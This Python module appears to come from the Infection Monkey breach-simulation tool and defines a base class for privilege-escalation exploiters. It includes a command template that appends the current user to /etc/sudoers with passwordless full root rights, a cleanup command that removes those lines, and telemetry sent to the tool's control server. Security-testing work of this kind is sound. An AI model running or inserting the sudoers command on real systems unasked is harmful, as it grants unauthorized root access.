from abc import ABCMeta, abstractmethod
from os.path import dirname, basename, isfile, join
import subprocess
import glob
import getpass
from logging import getLogger

__author__ = 'D3fa1t'

LOG = getLogger(__name__)

REMOVE_LINES_WITH_TAG = "sudo sed -i '/{monkey_tag}/d' {file_name}"
ADDUSER_TO_SUDOERS = "echo '{user_name} ALL = NOPASSWD: ALL {monkey_tag}' | sudo tee -a /etc/sudoers"
MONKEY_TAG = "# ADDED BY INFECTION MONKEY"


class HostPrivExploiter(object):
    __metaclass__ = ABCMeta

    # Commands needed for PE

    @abstractmethod
    def try_priv_esc(self, command):
        raise NotImplementedError()

    def send_pe_telemetry(self, result, local_ip):
        from infection_monkey.control import ControlClient
        ControlClient.send_telemetry('pe', {'result': result, 'pe_name': self.__class__.__name__, 'ip': local_ip})

    @staticmethod
    def remove_from_sudoers():
        LOG.info("Removing users added to /etc/sudoers by monkey.")
        remove_from_sudoers = REMOVE_LINES_WITH_TAG.format(file_name="/etc/sudoers", monkey_tag=MONKEY_TAG)
        subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
                         creationflags=0)

    @staticmethod
    def get_add_user_to_sudoers_command():
        # get the current user name
        whoami = getpass.getuser()

        # Error reading off shell
        if not whoami:
            return False
        return ADDUSER_TO_SUDOERS.format(user_name=whoami, monkey_tag=MONKEY_TAG)


def get_pe_files():
    """
        Gets all files under current directory(/actions)
        :return: list of all files without .py ending
    """
    exclude_files = ('__init__.py', 'tools.py')
    files = glob.glob(join(dirname(__file__), "*.py"))
    return [basename(f)[:-3] for f in files if isfile(f) and not f.endswith(exclude_files)]
